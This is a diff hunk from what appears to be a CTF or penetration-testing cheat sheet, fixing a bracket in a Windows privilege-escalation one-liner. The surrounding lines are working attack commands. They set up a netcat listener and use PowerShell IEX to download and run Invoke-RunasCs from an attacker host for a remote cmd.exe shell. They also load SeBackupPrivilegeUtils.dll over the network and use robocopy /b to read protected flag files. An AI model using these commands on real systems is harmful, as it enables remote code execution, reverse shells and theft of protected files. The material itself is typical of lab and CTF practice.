@@ -1324,7 +1324,7 @@ rlwrap nc -lvnp 5566
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
 
 +---------- SeBackupPrivilege ----------+
-$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
+$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
 $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
